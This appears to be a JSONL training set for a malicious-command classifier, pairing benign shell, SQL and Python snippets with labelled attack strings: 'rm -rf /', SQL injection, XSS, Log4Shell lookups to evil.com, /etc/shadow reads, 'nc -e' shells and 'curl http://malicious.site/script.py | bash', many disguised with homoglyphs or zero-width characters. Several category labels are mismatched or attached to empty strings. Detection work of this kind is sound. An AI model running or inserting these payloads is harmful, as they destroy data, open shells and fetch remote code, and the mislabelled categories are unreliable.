+{"text": "perl -e 'DROP TABLE'", "label": 1, "category": "sql_destructive"}
+{"text": "cmd /c ", "label": 1, "category": "sql_time_based"}
+{"text": "/DEV/TCP", "label": 1, "category": "tcp_redirection"}
+{"text": "for i in range(10): print(i)", "label": 0, "category": "benign_python"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FROM  products  WHERE  price  >  100", "label": 0, "category": "benign_sql"}
+{"text": " ; bypass", "label": 1, "category": "network_scanning"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval(eval()", "label": 1, "category": "code_execution"}
+{"text": "log_entry  =  'DROP  TABLE  users'", "label": 0, "category": "benign_hard"}
+{"text": "import  os;  os.systеm('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "#  Note:  This  uses  eval()  internally,  but  it's  safe", "label": 0, "category": "benign_hard"}
+{"text": "code  =  executor.compile('print(1)')", "label": 0, "category": "benign_hard"}
+{"text": "# wc -l file.txt", "label": 0, "category": "benign_shell"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "perl -e ''", "label": 1, "category": "sql_union_injection"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "How does this function work?", "label": 0, "category": "benign_text"}
+{"text": "SELECT  *  FROM  users  WHERE  id  =  1", "label": 0, "category": "benign_sql"}
+{"text": "Can you help me with this?", "label": 0, "category": "benign_text"}
+{"text": "DROP TаBLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "system( # bypass", "label": 1, "category": "system_call"}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval()", "label": 1, "category": "sql_union_injection"}
+{"text": "data  =  {'key':  'value'}", "label": 0, "category": "benign_python"}
+{"text": ";\neval(", "label": 1, "category": "code_execution"}
+{"text": "INSERT  INTO  logs  (message,  timestamp)  VALUES  ('info',  NOW())", "label": 0, "category": "benign_sql"}
+{"text": "shell_exec # bypass", "label": 1, "category": "shell_execution"}
+{"text": "echo  'Hello  World'", "label": 0, "category": "benign_shell"}
+{"text": "; ", "label": 1, "category": "ransomware_pattern"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP TABLе users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FRоM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "powershell -Command \"\"", "label": 1, "category": "sql_comment_bypass"}
+{"text": ";\nwget http://", "label": 1, "category": "remote_code_fetch"}
+{"text": "import  math", "label": 0, "category": "benign_python"}
+{"text": "status  =  system_info.get_uptime()", "label": 0, "category": "benign_hard"}
+{"text": "UNION SELECT /* bypass", "label": 1, "category": "sql_injection"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "log_entry  =  'DROP  TABLE  users'", "label": 0, "category": "benign_hard"}
+{"text": "value  =  math_eval('sqrt(16)')", "label": 0, "category": "benign_hard"}
+{"text": "echo  $HOME", "label": 0, "category": "benign_shell"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import  math", "label": 0, "category": "benign_python"}
+{"text": "cmd /c bash -i", "label": 1, "category": "interactive_shell"}
+{"text": "for  item  in  items:  process(item)", "label": 0, "category": "benign_python"}
+{"text": "#\npassthru", "label": 1, "category": "passthru_execution"}
+{"text": "tree  -L  2", "label": 0, "category": "benign_shell"}
+{"text": "exec('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "bash -c 'chmod 777'", "label": 1, "category": "permission_escalation"}
+{"text": "value  =  math_eval('sqrt(16)')", "label": 0, "category": "benign_hard"}
+{"text": "exec('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "data  =  {'key':  'value'}", "label": 0, "category": "benign_python"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "#\nDROP TABLE", "label": 1, "category": "sql_destructive"}
+{"text": "nc -e || echo success", "label": 1, "category": "reverse_shell"}
+{"text": "pwd", "label": 0, "category": "benign_shell"}
+{"text": "How  do  I  install  Python?", "label": 0, "category": "benign_text"}
+{"text": "-- TRUNCATE", "label": 1, "category": "sql_truncation"}
+{"text": "find  .  -name  '*.py'", "label": 0, "category": "benign_shell"}
+{"text": "SеLECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "wget+http://", "label": 1, "category": "remote_code_fetch"}
+{"text": "echo  'Hello  World'", "label": 0, "category": "benign_shell"}
+{"text": "// nc -e", "label": 1, "category": "reverse_shell"}
+{"text": "passthru REM bypass", "label": 1, "category": "passthru_execution"}
+{"text": "DELETE FROM backup;", "label": 1, "category": "sql_deletion"}
+{"text": "# pwd", "label": 0, "category": "benign_shell"}
+{"text": "..%5C", "label": 1, "category": "path_traversal_windows"}
+{"text": "REM\ncurl http://", "label": 1, "category": "remote_code_fetch"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": " | echo success", "label": 1, "category": "sql_time_based"}
+{"text": "tail  -f  log.txt", "label": 0, "category": "benign_shell"}
+{"text": "df  -h", "label": 0, "category": "benign_shell"}
+{"text": "Show  me  an  example", "label": 0, "category": "benign_text"}
+{"text": "pwd", "label": 0, "category": "benign_shell"}
+{"text": "SеLECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "impоrt  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm\\x20\\x20-rf\\x20\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "#  Note:  This  uses  eval()  internally,  but  it's  safe", "label": 0, "category": "benign_hard"}
+{"text": "UNION+SELECT", "label": 1, "category": "sql_injection"}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "popen( && echo success", "label": 1, "category": "process_execution"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "sh -c \"UNION SELECT\"", "label": 1, "category": "sql_injection"}
+{"text": "ls  -R", "label": 0, "category": "benign_shell"}
+{"text": "SеLECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "#  TODO:  Remove  debug  line:  system('ls')", "label": 0, "category": "benign_hard"}
+{"text": " ; bypass", "label": 1, "category": "sql_time_based"}
+{"text": "def hello(): return 'world'", "label": 0, "category": "benign_python"}
+{"text": "node -e \"eval(\"", "label": 1, "category": "code_execution"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  category,  COUNT(*)  FROM  products  GROUP  BY  category", "label": 0, "category": "benign_sql"}
+{"text": " REM bypass", "label": 1, "category": "keylogger_installation"}
+{"text": "rm\\x20-rf\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "/* ", "label": 1, "category": "sql_time_based"}
+{"text": "eval( | echo success", "label": 1, "category": "code_execution"}
+{"text": "python -c \"\"", "label": 1, "category": "privilege_escalation"}
+{"text": "cmd /c /dev/tcp", "label": 1, "category": "tcp_redirection"}
+{"text": "#\nwget http://", "label": 1, "category": "remote_code_fetch"}
+{"text": "<!--\npopen(", "label": 1, "category": "process_execution"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "--\nDELETE FROM", "label": 1, "category": "sql_deletion"}
+{"text": "../", "label": 1, "category": "path_traversal"}
+{"text": "# ", "label": 1, "category": "reverse_shell"}
+{"text": "eVaL('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "--\nnc -e", "label": 1, "category": "reverse_shell"}
+{"text": "echo 'Hello World'", "label": 0, "category": "benign_shell"}
+{"text": "from  datetime  import  datetime", "label": 0, "category": "benign_python"}
+{"text": "<script>alert('xss')</script>‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "bash -c ''", "label": 1, "category": "reverse_shell"}
+{"text": "; ", "label": 1, "category": "network_scanning"}
+{"text": "--\n", "label": 1, "category": "sql_comment_bypass"}
+{"text": "//\nUNION SELECT", "label": 1, "category": "sql_injection"}
+{"text": "curl -I https://example.com", "label": 0, "category": "benign_shell"}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "..\\ ; bypass", "label": 1, "category": "path_traversal_windows"}
+{"text": "data = {'key': 'value'}", "label": 0, "category": "benign_python"}
+{"text": "rm    -rf    /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# wc -l file.txt", "label": 0, "category": "benign_shell"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# uname -a", "label": 0, "category": "benign_shell"}
+{"text": "ruby -e \"bash -i\"", "label": 1, "category": "interactive_shell"}
+{"text": "# Note: This uses eval() internally, but it's safe", "label": 0, "category": "benign_hard"}
+{"text": "ls  -lh", "label": 0, "category": "benign_shell"}
+{"text": "eval()", "label": 1, "category": "reverse_shell"}
+{"text": "wget http:// // bypass", "label": 1, "category": "remote_code_fetch"}
+{"text": "shell_exec /* bypass", "label": 1, "category": "shell_execution"}
+{"text": "UPDATE  products  SET  price  =  99.99  WHERE  id  =  123", "label": 0, "category": "benign_sql"}
+{"text": "REM\npassthru", "label": 1, "category": "passthru_execution"}
+{"text": "SELECT  *  FROM  users  WHERE  id%3D1  OR  1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "wget  --spider  https://example.com", "label": 0, "category": "benign_shell"}
+{"text": "SELECT  u.name,  o.total  FROM  users  u  JOIN  orders  o  ON  u.id  =  o.user_id", "label": 0, "category": "benign_sql"}
+{"text": "x  =  1  +  2", "label": 0, "category": "benign_python"}
+{"text": "/etc/passwd || echo success", "label": 1, "category": "sensitive_file_access"}
+{"text": "result  =  system_check.is_healthy()", "label": 0, "category": "benign_hard"}
+{"text": "while  count  <  10:  count  +=  1", "label": 0, "category": "benign_python"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "/*\npopen(", "label": 1, "category": "process_execution"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "tree  -L  2", "label": 0, "category": "benign_shell"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import\\x20\\x20os;\\x20\\x20os.system('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "How  does  this  function  work?", "label": 0, "category": "benign_text"}
+{"text": "exec(rm -rf)", "label": 1, "category": "destructive_file_operation"}
+{"text": "../ ; bypass", "label": 1, "category": "path_traversal"}
+{"text": "ruby -e \"'; --\"", "label": 1, "category": "sql_comment_injection"}
+{"text": "exec('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "//  This  function  calls  exec(),  but  with  sanitized  input", "label": 0, "category": "benign_hard"}
+{"text": "../ # bypass", "label": 1, "category": "path_traversal"}
+{"text": "#  TODO:  Remove  debug  line:  system('ls')", "label": 0, "category": "benign_hard"}
+{"text": "# ", "label": 1, "category": "sql_union_injection"}
+{"text": "exec()", "label": 1, "category": "sql_union_injection"}
+{"text": "DROP TABLе users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm    -rf    /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../ || echo success", "label": 1, "category": "path_traversal"}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<!--\n", "label": 1, "category": "privilege_escalation"}
+{"text": "bash -c '/etc/shadow'", "label": 1, "category": "sensitive_file_access"}
+{"text": "SELECT  *  FROM  products  WHERE  price  >  100", "label": 0, "category": "benign_sql"}
+{"text": "SELECT * FROM users WHERE id%3D1 OR 1%3D1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "from datetime import datetime", "label": 0, "category": "benign_python"}
+{"text": "INSERT  INTO  logs  (message,  timestamp)  VALUES  ('info',  NOW())", "label": 0, "category": "benign_sql"}
+{"text": "/dev/tcp # bypass", "label": 1, "category": "tcp_redirection"}
+{"text": "result  =  evaluator.calculate('2+2')", "label": 0, "category": "benign_hard"}
+{"text": "SELECT  category,  COUNT(*)  FROM  products  GROUP  BY  category", "label": 0, "category": "benign_sql"}
+{"text": "echo 'eval('", "label": 1, "category": "code_execution"}
+{"text": "POPEN(", "label": 1, "category": "process_execution"}
+{"text": "eval('alert(1)')​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "wc  -l  file.txt", "label": 0, "category": "benign_shell"}
+{"text": "import  json", "label": 0, "category": "benign_python"}
+{"text": "REM ..\\", "label": 1, "category": "path_traversal_windows"}
+{"text": "def  calculate_sum(a,  b):  return  a  +  b", "label": 0, "category": "benign_python"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  user_id,  SUM(amount)  FROM  orders  GROUP  BY  user_id", "label": 0, "category": "benign_sql"}
+{"text": "// DROP TABLE", "label": 1, "category": "sql_destructive"}
+{"text": "eval(popen()", "label": 1, "category": "process_execution"}
+{"text": "//  This  function  calls  exec(),  but  with  sanitized  input", "label": 0, "category": "benign_hard"}
+{"text": "<script>alеrt('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "df  -h", "label": 0, "category": "benign_shell"}
+{"text": "result  =  'test'.replace('t',  'T')", "label": 0, "category": "benign_python"}
+{"text": "numbers  =  [1,  2,  3,  4,  5]", "label": 0, "category": "benign_python"}
+{"text": "system( /* bypass", "label": 1, "category": "system_call"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "code  =  executor.compile('print(1)')", "label": 0, "category": "benign_hard"}
+{"text": "import  json", "label": 0, "category": "benign_python"}
+{"text": "uname  -a", "label": 0, "category": "benign_shell"}
+{"text": "passthru /* bypass", "label": 1, "category": "passthru_execution"}
+{"text": "import  math", "label": 0, "category": "benign_python"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What  is  the  weather  today?", "label": 0, "category": "benign_text"}
+{"text": "exec(/etc/shadow)", "label": 1, "category": "sensitive_file_access"}
+{"text": "df  -h", "label": 0, "category": "benign_shell"}
+{"text": "perl -e '../'", "label": 1, "category": "path_traversal"}
+{"text": "result  =  system_check.is_healthy()", "label": 0, "category": "benign_hard"}
+{"text": "​隐藏​字符‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  COUNT(*)  FROM  orders", "label": 0, "category": "benign_sql"}
+{"text": "import  os", "label": 0, "category": "benign_python"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": " && echo success", "label": 1, "category": "sql_union_injection"}
+{"text": "# ", "label": 1, "category": "credential_dumping"}
+{"text": "REM\npopen(", "label": 1, "category": "process_execution"}
+{"text": "SELECT  user_id,  SUM(amount)  FROM  orders  GROUP  BY  user_id", "label": 0, "category": "benign_sql"}
+{"text": "ls  -lh", "label": 0, "category": "benign_shell"}
+{"text": "INSERT  INTO  users  (name,  email)  VALUES  ('John',  'john@example.com')", "label": 0, "category": "benign_sql"}
+{"text": "exec('rm\\x20-rf\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://еvil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "ls  -la", "label": 0, "category": "benign_shell"}
+{"text": "UPDATE  products  SET  price  =  99.99  WHERE  id  =  123", "label": 0, "category": "benign_sql"}
+{"text": "INSERT  INTO  users  (name,  email)  VALUES  ('John',  'john@example.com')", "label": 0, "category": "benign_sql"}
+{"text": "result  =  code_executor.run('safe_code')", "label": 0, "category": "benign_hard"}
+{"text": "exec('rm​ -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "numbers  =  [1,  2,  3,  4,  5]", "label": 0, "category": "benign_python"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "example_code  =  'bash  -i  >&  /dev/tcp/...'", "label": 0, "category": "benign_hard"}
+{"text": "WGET HTTP://", "label": 1, "category": "remote_code_fetch"}
+{"text": "SELECT  COUNT(*)  FROM  orders", "label": 0, "category": "benign_sql"}
+{"text": "<!-- '; --", "label": 1, "category": "sql_comment_injection"}
+{"text": "ruby -e \"TRUNCATE\"", "label": 1, "category": "sql_truncation"}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROPTABLE", "label": 1, "category": "sql_destructive"}
+{"text": "nc-e", "label": 1, "category": "reverse_shell"}
+{"text": "system( | echo success", "label": 1, "category": "system_call"}
+{"text": "SеLECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import  os", "label": 0, "category": "benign_python"}
+{"text": "impоrt  os;  os.system('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "wget http://malicious.site/script.py | bash", "label": 1, "category": "remote_code_fetch"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "sh -c \"\"", "label": 1, "category": "privilege_escalation"}
+{"text": "What  does  this  error  mean?", "label": 0, "category": "benign_text"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "ping  -c  3  google.com", "label": 0, "category": "benign_shell"}
+{"text": "DROP TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  name,  email  FROM  users", "label": 0, "category": "benign_sql"}
+{"text": "Show  me  an  example", "label": 0, "category": "benign_text"}
+{"text": " | echo success", "label": 1, "category": "ransomware_pattern"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": " ", "label": 1, "category": "sql_union_injection"}
+{"text": "exec()", "label": 1, "category": "privilege_escalation"}
+{"text": "${jndi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "ls  -la", "label": 0, "category": "benign_shell"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "ruby -e \"rm -rf\"", "label": 1, "category": "destructive_file_operation"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "example_code  =  'bash  -i  >&  /dev/tcp/...'", "label": 0, "category": "benign_hard"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": ";\nchmod 777", "label": 1, "category": "permission_escalation"}
+{"text": "text  =  'hello  world'.title()", "label": 0, "category": "benign_python"}
+{"text": "${jndi:ldap://evil.com/a}‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP​ TABLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Delete from", "label": 1, "category": "sql_deletion"}
+{"text": "for  item  in  items:  process(item)", "label": 0, "category": "benign_python"}
+{"text": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "text  =  'Hello  World'.upper()", "label": 0, "category": "benign_python"}
+{"text": "nc -e ; echo success", "label": 1, "category": "reverse_shell"}
+{"text": "data  =  json.load(open('data.json'))", "label": 0, "category": "benign_python"}
+{"text": "import os; os.systеm('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "uname  -a", "label": 0, "category": "benign_shell"}
+{"text": "REM ", "label": 1, "category": "ransomware_pattern"}
+{"text": "DROP​ TABLE ​users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "# UNION SELECT", "label": 1, "category": "sql_injection"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "// wget http://", "label": 1, "category": "remote_code_fetch"}
+{"text": "# pwd", "label": 0, "category": "benign_shell"}
+{"text": "exeс('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  *  FROM  products  WHERE  price  >  100", "label": 0, "category": "benign_sql"}
+{"text": " && echo success", "label": 1, "category": "credential_dumping"}
+{"text": "popen( ; bypass", "label": 1, "category": "process_execution"}
+{"text": "cat  README.md", "label": 0, "category": "benign_shell"}
+{"text": "curl http://malicious.site/script.py | bash", "label": 1, "category": "remote_code_fetch"}
+{"text": "find  .  -name  '*.py'", "label": 0, "category": "benign_shell"}
+{"text": "for  i  in  range(10):  print(i)", "label": 0, "category": "benign_python"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "--\nchmod 777", "label": 1, "category": "permission_escalation"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>аlert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "output  =  safe_eval('1+1')", "label": 0, "category": "benign_hard"}
+{"text": "rm\\x20\\x20-rf\\x20\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "words = 'hello world'.split()", "label": 0, "category": "benign_python"}
+{"text": "How  does  this  function  work?", "label": 0, "category": "benign_text"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT  u.name,  o.total  FROM  users  u  JOIN  orders  o  ON  u.id  =  o.user_id", "label": 0, "category": "benign_sql"}
+{"text": "powershell -Command \"../\"", "label": 1, "category": "path_traversal"}
+{"text": "result  =  code_executor.run('safe_code')", "label": 0, "category": "benign_hard"}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "tail  -f  log.txt", "label": 0, "category": "benign_shell"}
+{"text": "exec(bash -i)", "label": 1, "category": "interactive_shell"}
+{"text": "# uname -a", "label": 0, "category": "benign_shell"}
+{"text": "-- ", "label": 1, "category": "network_scanning"}
+{"text": "shell_exec <!-- bypass", "label": 1, "category": "shell_execution"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "INSERT  INTO  users  (name,  email)  VALUES  ('John',  'john@example.com')", "label": 0, "category": "benign_sql"}
+{"text": "items  =  [x  for  x  in  range(10)]", "label": 0, "category": "benign_python"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "example_code  =  'bash  -i  >&  /dev/tcp/...'", "label": 0, "category": "benign_hard"}
+{"text": " # bypass", "label": 1, "category": "ransomware_pattern"}
+{"text": "nc -e ; bypass", "label": 1, "category": "reverse_shell"}
